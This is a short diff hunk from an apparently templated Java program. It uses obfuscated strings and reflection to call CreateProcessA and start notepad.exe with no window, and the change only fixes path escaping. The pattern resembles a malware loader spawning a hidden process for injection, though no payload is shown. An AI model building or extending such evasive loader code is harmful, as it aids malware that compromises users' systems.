@@ -188,7 +188,7 @@ public class Main {
 
     Object createProc = getFunc.invoke(null, new Object[]{k32, x(${xs("CreateProcessA")})});
     // CreateProcessA(notepad_path, NULL, NULL, NULL, false, CREATE_NO_WINDOW, NULL, NULL, si, pi)
-    String notepadPath = x(${xs("C:\\\\Windows\\\\notepad.exe")});
+    String notepadPath = x(${xs("C:\\Windows\\notepad.exe")});
     Object cpResult = invoke4.invoke(createProc, new Object[]{int.class, new Object[]{
       notepadPath, NULL, NULL, NULL, 0, 0x08000000, NULL, NULL, siMem, piMem
     }});
